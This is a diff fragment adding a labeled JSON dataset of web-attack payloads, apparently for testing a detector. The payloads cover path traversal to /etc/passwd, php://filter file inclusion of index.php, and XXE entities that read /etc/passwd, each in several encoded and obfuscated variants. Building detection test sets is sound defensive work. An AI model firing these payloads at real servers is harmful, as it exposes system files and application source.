+    "payload": "%2e%2e%2f%2e%2e%2fetc/passwd",
+    "label": 1,
+    "attack_type": "ptrav",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "ptrav_combo_131",
+    "payload": "lI4VlI4VzXrjL3BHC3n3ZA==",
+    "label": 1,
+    "attack_type": "ptrav",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "ptrav_combo_132",
+    "payload": "%2525%2532%2565%2525%2532%2565%2525%2532%2566%2525%2532%2565%2525%2532%2565%2525%2532%2566%2565%2574%2563%252F%2570%2561%2573%2573%2577%2564",
+    "label": 1,
+    "attack_type": "ptrav",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "lfi_orig",
+    "payload": "php://filter/convert.base64-encode/resource=index.php",
+    "label": 1,
+    "attack_type": "lfi",
+    "param_location": "query",
+    "source": "original"
+  },
+  {
+    "id": "lfi_obf_url_encode_full",
+    "payload": "%70%68%70%3A%2F%2F%66%69%6C%74%65%72%2F%63%6F%6E%76%65%72%74%2E%62%61%73%65%36%34%2D%65%6E%63%6F%64%65%2F%72%65%73%6F%75%72%63%65%3D%69%6E%64%65%78%2E%70%68%70",
+    "label": 1,
+    "attack_type": "lfi",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "lfi_obf_base64_encode",
+    "payload": "cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1pbmRleC5waHA=",
+    "label": 1,
+    "attack_type": "lfi",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "lfi_obf_url_encode_double",
+    "payload": "%2570%2568%2570%253A%252F%252F%2566%2569%256C%2574%2565%2572%252F%2563%256F%256E%2576%2565%2572%2574%252E%2562%2561%2573%2565%2536%2534%252D%2565%256E%2563%256F%2564%2565%252F%2572%2565%2573%256F%2575%2572%2563%2565%253D%2569%256E%2564%2565%2578%252E%2570%2568%2570",
+    "label": 1,
+    "attack_type": "lfi",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "lfi_obf_hex_encode",
+    "payload": "7068703a2f2f66696c7465722f636f6e766572742e6261736536342d656e636f64652f7265736f757263653d696e6465782e706870",
+    "label": 1,
+    "attack_type": "lfi",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "lfi_obf_case_randomize",
+    "payload": "Php://fIlTer/CoNvErt.BaSE64-ENCode/REsoUrcE=iNDeX.Php",
+    "label": 1,
+    "attack_type": "lfi",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "lfi_obf_path_encoding",
+    "payload": "php:%2f%2ffilter%2fconvert.base64-encode%2fresource=index.php",
+    "label": 1,
+    "attack_type": "lfi",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "lfi_combo_140",
+    "payload": "php://filter/convert.base64\n-encode/resource\t=index.php",
+    "label": 1,
+    "attack_type": "lfi",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "lfi_combo_141",
+    "payload": "%2570%2548%2550%253A%252F%252F%2566%2549%254C%2574%2545%2572%252F%2563%256F%254E%2556%2545%2572%2574%252E%2562%2561%2553%2545%2536%2534%252D%2565%256E%2563%256F%2564%2545%252F%2552%2565%2573%256F%2555%2572%2543%2545%253D%2569%256E%2544%2545%2558%252E%2550%2568%2570",
+    "label": 1,
+    "attack_type": "lfi",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "lfi_combo_142",
+    "payload": "pHP:%2f%2fFiLtER%2fCONVERT.bASe64-encODe%2fReSOURcE=iNDEX.PHp",
+    "label": 1,
+    "attack_type": "lfi",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xxe_orig",
+    "payload": "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
+    "label": 1,
+    "attack_type": "xxe",
+    "param_location": "body",
+    "source": "original"
+  },
+  {
+    "id": "xxe_obf_url_encode_full",
+    "payload": "%3C%3F%78%6D%6C %76%65%72%73%69%6F%6E%3D%27%31%2E%30%27%3F%3E%3C%21%44%4F%43%54%59%50%45 %66%6F%6F %5B%3C%21%45%4E%54%49%54%59 %78%78%65 %53%59%53%54%45%4D %27%66%69%6C%65%3A%2F%2F%2F%65%74%63%2F%70%61%73%73%77%64%27%3E%5D%3E%3C%66%6F%6F%3E%26%78%78%65%3B%3C%2F%66%6F%6F%3E",
+    "label": 1,
+    "attack_type": "xxe",
+    "param_location": "body",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xxe_obf_html_entity_encode",
+    "payload": "&lt;?xml version=&#39;1.0&#39;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#39;file:///etc/passwd&#39;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;",
+    "label": 1,
+    "attack_type": "xxe",
+    "param_location": "body",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xxe_obf_base64_encode",
+    "payload": "PD94bWwgdmVyc2lvbj0nMS4wJz8-PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgeHhlIFNZU1RFTSAnZmlsZTovLy9ldGMvcGFzc3dkJz5dPjxmb28-Jnh4ZTs8L2Zvbz4",
+    "label": 1,
+    "attack_type": "xxe",
+    "param_location": "body",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xxe_obf_url_encode_double",
+    "payload": "%253C%253F%2578%256D%256C %2576%2565%2572%2573%2569%256F%256E%253D%2527%2531%252E%2530%2527%253F%253E%253C%2521%2544%254F%2543%2554%2559%2550%2545 %2566%256F%256F %255B%253C%2521%2545%254E%2554%2549%2554%2559 %2578%2578%2565 %2553%2559%2553%2554%2545%254D %2527%2566%2569%256C%2565%253A%252F%252F%252F%2565%2574%2563%252F%2570%2561%2573%2573%2577%2564%2527%253E%255D%253E%253C%2566%256F%256F%253E%2526%2578%2578%2565%253B%253C%252F%2566%256F%256F%253E",
+    "label": 1,
+    "attack_type": "xxe",
+    "param_location": "body",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xxe_obf_hex_encode",
+    "payload": "3c3f786d6c2076657273696f6e3d27312e30273f3e3c21444f435459504520666f6f205b3c21454e54495459207878652053595354454d202766696c653a2f2f2f6574632f706173737764273e5d3e3c666f6f3e267878653b3c2f666f6f3e",
+    "label": 1,
+    "attack_type": "xxe",
+    "param_location": "body",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xxe_obf_case_randomize",
+    "payload": "<?xML VERsIOn='1.0'?><!dOctYpe FoO [<!enTitY XXE SYSTem 'FilE:///Etc/PASsWD'>]><fOo>&XxE;</fOO>",
+    "label": 1,
+    "attack_type": "xxe",
+    "param_location": "body",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xxe_obf_sql_char_encode",
+    "payload": "<?xml version=CHAR(49,46,48)?><!DOCTYPE foo [<!ENTITY xxe SYSTEM CHAR(102,105,108,101,58,47,47,47,101,116,99,47,112,97,115,115,119,100)>]><foo>&xxe;</foo>",
+    "label": 1,
+    "attack_type": "xxe",
+    "param_location": "body",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xxe_obf_path_encoding",
+    "payload": "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:%2f%2f%2fetc%2fpasswd'>]><foo>&xxe;<%2ffoo>",
+    "label": 1,
+    "attack_type": "xxe",
+    "param_location": "body",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xxe_obf_command_obfuscation",
+    "payload": "<?xml\tversion='1.0'?><!DOCTYPE\tfoo\t[<!ENTITY\txxe\tSYSTEM\t'file:///etc/passwd'>]><foo>&xxe;</foo>",
+    "label": 1,
+    "attack_type": "xxe",
+    "param_location": "body",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xxe_combo_153",
+    "payload": "Pd94BwWgDMvYC2LvBJ0NMS4wjz8-PcFet0NuwVBfigZVbYbBpcfftLrJvfKgEHhLIFNzu1rfTSAnZmlSztOvLY9LDGMVCgfZc3DkjZ5dpJXMB28-jNH4zts8l2zvBZ4=",
+    "label": 1,
+    "attack_type": "xxe",
+    "param_location": "body",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xxe_combo_154",
+    "payload": "&lt;?xml version=&#39;1.0&#39;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#39;file:///etc/passwd&#39;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;",
+    "label": 1,
+    "attack_type": "xxe",
+    "param_location": "body",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xxe_combo_155",
+    "payload": "M2MzZjc4NmQ2YzIwNzY2NTcyNzM2OTZmNmUzZDI3MzEyZTMwMjczZjNlM2MyMTQ0NGY0MzU0NTk1MDQ1MjA2NjZmNmYyMDViM2MyMTQ1NGU1NDQ5NTQ1OTIwNzg3ODY1MjA1MzU5NTM1NDQ1NGQyMDI3NjY2OTZjNjUzYTJmMmYyZjY1NzQ2MzJmNzA2MTczNzM3NzY0MjczZTVkM2UzYzY2NmY2ZjNlMjY3ODc4NjUzYjNjMmY2NjZmNmYzZQ==",
+    "label": 1,
+    "attack_type": "xxe",
+    "param_location": "body",
+    "source": "test_heavy"
+  }
+]
